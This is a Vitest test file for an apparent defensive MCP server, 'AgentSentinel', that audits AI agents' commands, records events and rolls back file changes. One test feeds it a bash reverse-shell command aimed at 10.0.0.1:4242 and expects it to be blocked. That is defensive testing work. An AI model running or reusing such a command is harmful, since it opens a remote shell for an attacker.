import { describe, it, expect, beforeEach } from 'vitest';
import { AgentSentinelMCPServer } from '../src/mcp/mcp_server.js';
import * as fs from 'node:fs';
import * as path from 'node:path';
import * as os from 'node:os';

describe('AgentSentinelMCPServer', () => {
  let server: AgentSentinelMCPServer;

  beforeEach(() => {
    server = new AgentSentinelMCPServer('test-mcp-agent');
  });

  it('should handle "initialize" JSON-RPC method', async () => {
    const res = await server.handleRequest({
      jsonrpc: '2.0',
      id: 1,
      method: 'initialize',
      params: {},
    });

    expect(res.id).toBe(1);
    expect(res.error).toBeUndefined();
    const result = res.result as any;
    expect(result.protocolVersion).toBe('2024-11-05');
    expect(result.serverInfo.name).toBe('agentsentinel');
  });

  it('should handle "tools/list" and return all 12 defense tools', async () => {
    const res = await server.handleRequest({
      jsonrpc: '2.0',
      id: 2,
      method: 'tools/list',
    });

    expect(res.id).toBe(2);
    const result = res.result as { tools: Array<{ name: string; description: string }> };
    expect(result.tools).toHaveLength(12);

    const toolNames = result.tools.map((t) => t.name);
    // 4 AST Security Tools
    expect(toolNames).toContain('sentinel_audit_command');
    expect(toolNames).toContain('sentinel_audit_sql');
    expect(toolNames).toContain('sentinel_scan_secrets');
    expect(toolNames).toContain('sentinel_verify_path');

    // 3 Blackbox Flight Recorder Tools
    expect(toolNames).toContain('sentinel_blackbox_record');
    expect(toolNames).toContain('sentinel_blackbox_verify');
    expect(toolNames).toContain('sentinel_blackbox_export');

    // 3 Atomic Rollback Tools
    expect(toolNames).toContain('sentinel_checkpoint_begin');
    expect(toolNames).toContain('sentinel_checkpoint_commit');
    expect(toolNames).toContain('sentinel_checkpoint_rollback');

    // 2 SmartProxy Tools
    expect(toolNames).toContain('sentinel_proxy_route');
    expect(toolNames).toContain('sentinel_proxy_metrics');
  });

  it('should audit and intercept malicious command via sentinel_audit_command', async () => {
    const res = await server.handleRequest({
      jsonrpc: '2.0',
      id: 20,
      method: 'tools/call',
      params: {
        name: 'sentinel_audit_command',
        arguments: {
          command: 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1',
        },
      },
    });

    expect(res.id).toBe(20);
    const body = JSON.parse((res.result as any).content[0].text);
    expect(body.verdict).toBe('BLOCK');
    expect(body.passed).toBe(false);
    expect(body.violationsCount).toBeGreaterThan(0);
    expect(body.violations[0].ruleId).toBe('block-reverse-shell');
  });

  it('should execute blackbox recording and verification via "tools/call"', async () => {
    // Record event
    const recordRes = await server.handleRequest({
      jsonrpc: '2.0',
      id: 3,
      method: 'tools/call',
      params: {
        name: 'sentinel_blackbox_record',
        arguments: {
          eventType: 'tool_call',
          payload: { command: 'deploy_contract', target: 'stellar-testnet' },
        },
      },
    });

    expect(recordRes.id).toBe(3);
    expect(recordRes.error).toBeUndefined();
    const recordContent = (recordRes.result as any).content[0].text;
    expect(recordContent).toContain('deploy_contract');

    // Verify integrity
    const verifyRes = await server.handleRequest({
      jsonrpc: '2.0',
      id: 4,
      method: 'tools/call',
      params: {
        name: 'sentinel_blackbox_verify',
        arguments: {},
      },
    });

    const verifyContent = JSON.parse((verifyRes.result as any).content[0].text);
    expect(verifyContent.isValid).toBe(true);
    expect(verifyContent.totalEntries).toBe(1);
    expect(verifyContent.merkleRoot).toBeDefined();
  });

  it('should execute atomic rollback workflow via "tools/call"', async () => {
    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'mcp-rollback-test-'));
    const testFile = path.join(tempDir, 'state.json');
    fs.writeFileSync(testFile, JSON.stringify({ count: 10 }), 'utf8');

    try {
      // 1. Begin checkpoint
      const beginRes = await server.handleRequest({
        jsonrpc: '2.0',
        id: 5,
        method: 'tools/call',
        params: {
          name: 'sentinel_checkpoint_begin',
          arguments: {
            name: 'state-update',
            watchFiles: [testFile],
          },
        },
      });

      const beginData = JSON.parse((beginRes.result as any).content[0].text);
      const checkpointId = beginData.checkpointId;
      expect(checkpointId).toBeDefined();

      // 2. Corrupt/Modify file
      fs.writeFileSync(testFile, JSON.stringify({ count: 9999, corrupted: true }), 'utf8');

      // 3. Rollback
      const rollbackRes = await server.handleRequest({
        jsonrpc: '2.0',
        id: 6,
        method: 'tools/call',
        params: {
          name: 'sentinel_checkpoint_rollback',
          arguments: { checkpointId },
        },
      });

      const rollbackData = JSON.parse((rollbackRes.result as any).content[0].text);
      expect(rollbackData.success).toBe(true);

      // Verify file is restored
      const restored = JSON.parse(fs.readFileSync(testFile, 'utf8'));
      expect(restored.count).toBe(10);
      expect(restored.corrupted).toBeUndefined();
    } finally {
      if (fs.existsSync(tempDir)) {
        fs.rmSync(tempDir, { recursive: true, force: true });
      }
    }
  });

  it('should return error for unknown JSON-RPC method', async () => {
    const res = await server.handleRequest({
      jsonrpc: '2.0',
      id: 99,
      method: 'unknown/method',
    });

    expect(res.id).toBe(99);
    expect(res.error).toBeDefined();
    expect(res.error?.code).toBe(-32601);
  });
});
